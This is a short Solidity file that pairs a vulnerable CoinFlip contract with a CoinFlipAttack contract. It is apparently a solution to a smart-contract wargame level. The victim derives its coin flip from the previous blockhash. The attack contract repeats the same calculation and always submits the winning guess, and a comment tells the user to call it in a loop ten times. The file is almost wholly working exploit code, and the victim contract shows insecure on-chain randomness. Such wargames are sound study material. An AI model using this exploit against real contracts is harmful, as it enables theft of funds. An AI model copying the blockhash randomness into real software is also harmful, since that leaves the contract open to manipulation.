pragma solidity ^0.4.24;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


contract CoinFlipAttack {

    CoinFlip victim;

    constructor(address _victim) public {
        victim = CoinFlip(_victim);
    }
 
    //victim is vulnerable because the "random" source is universally readable
    //call this funcion in a loop 10x
    function attack() external returns(bool success) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint blockVal = uint256(block.blockhash(block.number-1));
        uint flipVal =  blockVal / FACTOR;
        bool sideVal = flipVal == 1 ? true : false;

        success = victim.flip(sideVal);

        return success;
    }
}
